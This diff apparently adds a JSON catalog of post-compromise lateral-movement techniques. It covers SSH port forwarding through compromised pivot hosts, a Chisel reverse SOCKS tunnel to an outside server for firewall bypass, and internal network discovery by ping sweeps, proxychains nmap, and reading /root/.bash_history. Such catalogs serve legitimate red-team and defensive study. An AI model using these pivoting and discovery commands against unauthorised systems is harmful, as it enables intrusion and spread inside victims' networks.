@@ -1,0 +1,56 @@
+[
+  {
+    "id": "net-lat-001",
+    "category": "network",
+    "subcategory": "lateral_movement",
+    "title": "SSH Tunneling / Port Forwarding",
+    "description": "Create SSH tunnels to pivot through compromised hosts and access internal services. Supports local (-L), remote (-R), and dynamic (-D) forwarding.",
+    "techniques": [
+      "ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> <USER>@<PIVOT_HOST>",
+      "ssh -D 1080 <USER>@<PIVOT_HOST>",
+      "ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<PIVOT_HOST>"
+    ],
+    "indicators": ["SSH access to pivot host", "Internal services unreachable directly"],
+    "prerequisites": ["SSH credentials or key for pivot host", "Pivot host reachable"],
+    "tools": ["ssh", "sshpass", "autossh"],
+    "tags": ["ssh", "tunnel", "port-forwarding", "pivot", "lateral-movement", "socks-proxy"],
+    "confidence": 0.9,
+    "mitre_attack": "T1572"
+  },
+  {
+    "id": "net-lat-002",
+    "category": "network",
+    "subcategory": "lateral_movement",
+    "title": "SOCKS Proxy via Chisel",
+    "description": "Deploy Chisel for TCP/UDP tunneling through firewalls. Client-server model allows reverse tunneling when outbound connections are restricted.",
+    "techniques": [
+      "chisel server -p <PORT> --reverse",
+      "chisel client <SERVER_IP>:<PORT> R:<SOCKS_PORT>:socks",
+      "proxychains <COMMAND>"
+    ],
+    "indicators": ["Firewall restricts direct access", "Internal network reachable from pivot"],
+    "prerequisites": ["Binary upload capability", "Execution on pivot host"],
+    "tools": ["chisel", "proxychains"],
+    "tags": ["chisel", "socks", "proxy", "tunnel", "pivot", "firewall-bypass"],
+    "confidence": 0.85,
+    "mitre_attack": "T1090"
+  },
+  {
+    "id": "net-lat-003",
+    "category": "network",
+    "subcategory": "lateral_movement",
+    "title": "Internal Network Discovery via Pivot",
+    "description": "Scan internal networks through compromised pivot host to discover new targets for lateral movement.",
+    "techniques": [
+      "ssh <USER>@<PIVOT> 'for i in 192.168.{0..255}.{1..254}; do ping -c1 -W1 $i & done' | grep 'bytes from'",
+      "proxychains nmap -sT -Pn <INTERNAL_IP>",
+      "ssh <USER>@<PIVOT> 'cat /etc/hosts /root/.bash_history' | grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'"
+    ],
+    "indicators": ["Compromised host with internal interface", "ARP table shows internal hosts"],
+    "prerequisites": ["SSH or shell access to pivot host"],
+    "tools": ["nmap", "ssh", "proxychains"],
+    "tags": ["network-discovery", "internal-scan", "pivot", "lateral-movement"],
+    "confidence": 0.8,
+    "mitre_attack": "T1018"
+  }
+]
